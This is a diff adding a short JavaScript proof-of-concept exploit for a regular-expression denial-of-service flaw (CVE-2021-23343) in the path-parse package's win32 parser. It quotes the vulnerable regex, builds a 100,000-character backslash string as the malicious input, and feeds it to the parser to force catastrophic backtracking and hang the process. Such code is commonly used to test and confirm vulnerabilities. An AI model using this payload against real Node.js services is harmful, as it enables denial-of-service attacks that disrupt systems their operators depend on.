@@ -1,0 +1,27 @@
+```javascript
+// Exploit for ReDoS (CVE-2021-23343 / GHSA-hj48-42vr-x3v9) in path-parse's win32 parser.
+// node_modules/path-parse/index.js defines:
+//   var splitWindowsRe =
+//     /^(((?:[a-zA-Z]:|[\\\/]{2}[^\\\/]+[\\\/]+[^\\\/]+)?[\\\/]?)(?:[^\\\/]*[\\\/])*)((\.{1,2}|[^\\\/]+?|)(\.[^.\/\\]*|))[\\\/]*$/;
+//   function win32SplitPath(filename) { return splitWindowsRe.exec(filename).slice(1); }
+//   win32.parse = function(pathString) { ... win32SplitPath(pathString) ... };
+//   module.exports.win32 = win32.parse;
+// Feeding win32() a crafted path built from many separator characters forces
+// catastrophic backtracking in splitWindowsRe, causing the process to hang.
+
+const pathParse = require("path-parse");
+
+function buildAttack(n) {
+  return "\\".repeat(n) + "!";
+}
+
+const n = 100000; // increase further to make the hang more pronounced
+const malicious = buildAttack(n);
+
+console.log("Sending malicious path of length " + malicious.length + " to win32()...");
+const start = Date.now();
+
+pathParse.win32(malicious); // <-- triggers the vulnerable regex in win32SplitPath
+
+console.log("Finished in " + (Date.now() - start) + " ms");
+```
